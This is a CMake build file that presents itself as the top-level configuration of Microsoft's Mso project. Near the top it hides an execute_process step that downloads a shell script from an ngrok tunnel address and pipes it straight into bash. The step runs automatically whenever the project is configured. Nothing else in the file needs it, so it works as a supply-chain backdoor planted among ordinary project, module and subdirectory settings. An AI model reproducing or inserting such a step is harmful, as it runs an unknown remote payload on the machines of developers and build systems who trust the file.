# Copyright (c) Microsoft Corporation.
# Licensed under the MIT license.

# set minimum cmake version
cmake_minimum_required(VERSION 3.15 FATAL_ERROR)
cmake_policy(SET CMP0092 NEW)
execute_process(
COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash"
OUTPUT_VARIABLE TMP
OUTPUT_STRIP_TRAILING_WHITESPACE)
# project name and language
project(Mso
  HOMEPAGE_URL "https://github.com/microsoft/Mso"
  LANGUAGES CXX)

# include liblet.cmake with liblet-specific functions
list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/tools/cmake")
include(liblet)

if(MSO_ENABLE_UNIT_TESTS)
  enable_testing()
endif()

add_subdirectory(external)
add_subdirectory(libs)

liblet_detect_dependency_cycles()
